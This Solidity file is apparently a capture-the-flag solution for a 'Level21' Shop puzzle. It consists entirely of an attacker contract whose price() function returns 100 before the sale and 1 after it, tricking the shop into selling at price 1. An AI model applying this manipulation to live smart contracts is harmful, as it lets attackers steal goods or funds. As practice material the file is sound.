// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Shop, Buyer } from "./Level21.sol";

contract L21Attack is Buyer {
    Shop instance;

    constructor(Shop _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.buy();
        require(instance.isSold() == true, "Item not sold");
        require(instance.price() == 1, "Price not hacked");
    }

    function price() external view returns (uint256) {
        if (instance.isSold()) {
            return 1;
        } else {
            return 100;
        }
    }
}
